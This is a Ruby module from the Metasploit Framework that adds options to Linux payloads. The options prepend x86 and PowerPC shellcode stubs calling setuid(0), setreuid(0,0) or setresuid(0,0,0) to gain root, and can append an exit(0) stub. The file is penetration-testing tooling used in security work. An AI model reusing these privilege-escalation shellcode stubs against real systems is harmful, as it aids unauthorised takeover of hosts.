require 'msf/core'

###
#
# This class is here to implement advanced features for linux-based
# payloads. Linux payloads are expected to include this module if
# they want to support these features.
#
###
module Msf::Payload::Linux

	#
	# This mixin is chained within payloads that target the Linux platform.
	# It provides special prepends, to support things like chroot and setuid.
	#
	def initialize(info = {})
		ret = super(info)

		register_advanced_options(
			[
				Msf::OptBool.new('PrependSetresuid',
					[
						false,
						"Prepend a stub that executes the setresuid(0, 0, 0) system call",
						"false"
					]
				),
				Msf::OptBool.new('PrependSetreuid',
					[
						false,
						"Prepend a stub that executes the setreuid(0, 0) system call",
						"false"
					]
				),
				Msf::OptBool.new('PrependSetuid',
					[
						false,
						"Prepend a stub that executes the setuid(0) system call",
						"false"
					]
				),
				Msf::OptBool.new('AppendExit',
					[
						false,
						"Append a stub that executes the exit(0) system call",
						"false"
					]
				),
			], Msf::Payload::Linux)

		ret
	end


	#
	# Overload the generate() call to prefix our stubs
	#
	def generate(*args)
		# Call the real generator to get the payload
		buf = super(*args)
		pre = ''
		app = ''

		test_arch = [ *(self.arch) ]

		# Handle all x86 code here
		if (test_arch.include?(ARCH_X86))

			# Prepend

			if (datastore['PrependSetresuid'])
				# setresuid(0, 0, 0)
				pre << "\x31\xc9"             +#   xorl    %ecx,%ecx                  #
				       "\x31\xdb"             +#   xorl    %ebx,%ebx                  #
				       "\xf7\xe3"             +#   mull    %ebx                       #
				       "\xb0\xa4"             +#   movb    $0xa4,%al                  #
				       "\xcd\x80"              #   int     $0x80                      #
			end

			if (datastore['PrependSetreuid'])
				# setreuid(0, 0)
				pre << "\x31\xc9"             +#   xorl    %ecx,%ecx                  #
				       "\x31\xdb"             +#   xorl    %ebx,%ebx                  #
				       "\x6a\x46"             +#   pushl   $0x46                      #
				       "\x58"                 +#   popl    %eax                       #
				       "\xcd\x80"              #   int     $0x80                      #
			end

			if (datastore['PrependSetuid'])
				# setuid(0)
				pre << "\x31\xdb"             +#   xorl    %ebx,%ebx                  #
				       "\x6a\x17"             +#   pushl   $0x17                      #
				       "\x58"                 +#   popl    %eax                       #
				       "\xcd\x80"              #   int     $0x80                      #
			end

			# Append

			if (datastore['AppendExit'])
				# exit(0)
				app << "\x31\xdb"             +#   xorl    %ebx,%ebx                  #
				       "\x6a\x01"             +#   pushl   $0x01                      #
				       "\x58"                 +#   popl    %eax                       #
				       "\xcd\x80"              #   int     $0x80                      #
			end

		end

		# Handle all Power/CBEA code here
		if (test_arch.include?([ ARCH_PPC, ARCH_PPC64, ARCH_CBEA, ARCH_CBEA64 ]))

			# Prepend

			if (datastore['PrependSetresuid'])
				# setresuid(0, 0, 0)
				pre << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
				       "\x7c\xa5\x2a\x78"     +#   xor     r5,r5,r5                   #
				       "\x7c\x84\x22\x78"     +#   xor     r4,r4,r4                   #
				       "\x7c\x63\x1a\x78"     +#   xor     r3,r3,r3                   #
				       "\x38\x1f\xfe\xa5"     +#   addi    r0,r31,-347                #
				       "\x44\xff\xff\x02"      #   sc                                 #
			end

			if (datastore['PrependSetreuid'])
				# setreuid(0, 0)
				pre << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
				       "\x7c\x84\x22\x78"     +#   xor     r4,r4,r4                   #
				       "\x7c\x63\x1a\x78"     +#   xor     r3,r3,r3                   #
				       "\x38\x1f\xfe\x47"     +#   addi    r0,r31,-441                #
				       "\x44\xff\xff\x02"      #   sc                                 #
			end

			if (datastore['PrependSetuid'])
				# setuid(0)
				pre << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
				       "\x7c\x63\x1a\x78"     +#   xor     r3,r3,r3                   #
				       "\x38\x1f\xfe\x18"     +#   addi    r0,r31,-488                #
				       "\x44\xff\xff\x02"      #   sc                                 #
			end

			# Append

			if (datastore['AppendExit'])
				# exit(0)
				app << "\x3b\xe0\x01\xff"     +#   li      r31,511                    #
				       "\x7c\x63\x1a\x78"     +#   xor     r3,r3,r3                   #
				       "\x38\x1f\xfe\x02"     +#   addi    r0,r31,-510                #
				       "\x44\xff\xff\x02"      #   sc                                 #
			end

		end

		return (pre + buf + app)
	end


end
